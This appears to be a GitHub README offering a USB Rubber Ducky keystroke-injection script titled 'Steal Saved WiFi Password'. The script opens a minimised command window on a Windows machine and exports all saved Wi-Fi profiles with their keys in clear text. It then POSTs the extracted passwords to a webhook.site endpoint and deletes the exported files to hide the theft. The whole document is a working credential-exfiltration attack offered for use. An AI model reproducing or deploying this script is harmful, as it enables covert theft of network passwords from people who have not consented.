# StealWiFiDuckyScript
USB Rubber Ducky Script for capture saved wifi passwords
<pre>
<code>
REM Ducky Script for Steal Saved WiFi Password
REM Author - TechChip
REM https://github.com/techchipnet
REM https://youtube.com/techchipnet
DELAY 500
GUI r
DELAY 1000
STRING cmd /k mode con: cols=25 lines=1
DELAY 100
ENTER
DELAY 1000
STRING cd %temp%
ENTER
DELAY 500
STRING netsh wlan export profile key=clear
ENTER
DELAY 500
STRING powershell Select-String -Path Wi-Fi*.xml -Pattern 'keyMaterial' > WiFi-Key
ENTER
DELAY 1000
DELAY 500
REM next command will post wifi password on webhook.site
REM watch demo on techchip youtube channel
STRING powershell Invoke-WebRequest -Uri https://webhook.site/<paste webhook unique id here> -Method POST -InFile WiFi-Key
ENTER
STRING del Wi* /s/f/q
ENTER
DELAY 500
STRING exit
ENTER
</code>
</pre>
